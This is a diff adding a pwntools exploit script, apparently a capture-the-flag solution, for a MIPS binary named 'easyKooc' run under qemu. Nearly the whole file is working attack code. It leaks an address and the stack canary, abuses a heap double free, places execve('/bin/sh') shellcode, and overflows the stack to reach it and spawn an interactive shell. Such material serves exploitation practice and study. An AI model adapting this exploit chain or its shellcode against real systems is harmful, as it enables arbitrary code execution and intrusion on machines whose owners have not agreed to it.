@@ -1,0 +1,61 @@
+#!/usr/bin/python
+#coding=utf-8
+from PwnContext import *
+from IPython import embed as ipy
+
+context.terminal = ['gnome-terminal','-x','sh','-c']
+# context.log_level = 'debug'
+p = process('qemu-mipsel -L ./mipsel-linux-gnu ./easyKooc',shell=True)
+context(arch='mips',os='linux',endian='little')
+def menu(chi):
+	p.sendlineafter('choice\n',str(chi))
+def add(idx,context):
+	menu(1)
+	p.sendlineafter('!\n',str(idx))
+	p.sendafter('content\n',context)
+def delete(idx):
+	menu(2)
+	p.sendlineafter('!\n',str(idx))
+def edit(leave):
+	menu(3)
+	p.sendafter('leave?\n',leave)
+def lg(s,addr):
+    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
+p.recvuntil('!\n')
+# shellcode  = ""
+# shellcode += "\xFF\xFF\x10\x04\xAB\x0F\x02\x24"
+# shellcode += "\x55\xF0\x46\x20\x66\x06\xFF\x23"
+# shellcode += "\xC2\xF9\xEC\x23\x66\x06\xBD\x23"
+# shellcode += "\x9A\xF9\xAC\xAF\x9E\xF9\xA6\xAF"
+# shellcode += "\x9A\xF9\xBD\x23\x21\x20\x80\x01"
+# shellcode += "\x21\x28\xA0\x03\xCC\xCD\x44\x03"
+# shellcode += "/bin/sh"
+shellcode = "\xff\xff\x06\x28\xff\xff\xd0\x04\xff\xff\x05\x28\x01\x10\xe4\x27\x0f\xf0\x84\x24\xab\x0f\x02\x24\x0c\x01\x01\x01/bin/sh"
+p.send('aaaa')
+p.recvuntil('0x')
+addr = int(p.recvuntil('\n',drop=True),16)
+
+edit('a'*33)
+p.recvuntil('a'*33)
+canary = u32(p.recv(3).rjust(4,'\x00'))
+
+add(1,'aaaa')
+add(2,'bbbb')
+delete(1)
+delete(2)
+delete(1)
+add(3,p32(addr-10))
+add(4,'\x00')
+p.recvuntil('your content is: ')
+heap = u32(p.recv(3).ljust(4,'\x00'))
+add(5,shellcode)
+lg('gift',addr)
+lg('canary',canary)
+lg('heap',heap)
+add(6,'a'*42+p32(canary)+p32(0)+p32(heap+8+0x70))
+menu(4)
+p.interactive()
+
+# 0x7ffff03c
+# 0x7ffff00c-10+8
+# b0 70
